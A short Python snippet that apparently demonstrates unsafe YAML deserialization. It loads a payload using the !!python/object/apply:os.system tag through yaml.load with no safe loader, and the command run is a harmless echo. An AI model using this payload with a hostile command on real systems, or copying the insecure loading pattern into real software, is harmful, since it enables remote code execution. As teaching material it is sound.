import yaml

def vulnerable_load_yaml(yaml_data):
    return yaml.load(yaml_data)

yaml_data = """
- !!python/object/apply:os.system
  args: ["echo vulnerable"]
"""

result = vulnerable_load_yaml(yaml_data)
print(result)